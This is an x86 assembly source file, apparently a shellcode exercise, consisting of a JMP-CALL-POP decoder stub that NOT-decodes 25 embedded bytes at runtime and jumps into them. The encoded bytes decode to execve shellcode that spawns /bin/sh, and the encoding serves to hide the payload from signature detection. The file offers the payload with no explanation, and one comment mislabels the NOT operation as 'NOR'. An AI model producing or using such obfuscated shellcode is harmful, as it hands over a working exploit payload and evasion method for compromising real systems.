global _start

section .text

_start:
    jmp short setshellcode ; set up shellcode in memory

decoder:
    pop esi ; pop shellcode address from stack
    xor ecx, ecx ; reset counter to zero
    mov cl, 25 ; set counter to 25

decode:
    not byte [esi] ; NOR at esi
    inc esi ; next byte
    loop decode ;next iteration

    jmp short encoded ; execute shellcode once ecx eq 0

setshellcode:
    call decoder ; call loop initialization
    encoded: db 0xce,0x3f,0xaf,0x97,0x91,0xd0,0x8c,0x97,0x97,0xd0,0xd0,0x9d,0x96,0x76,0x1c,0xaf,0x76,0x1d,0xac,0x76,0x1e,0x4f,0xf4,0x32,0x7f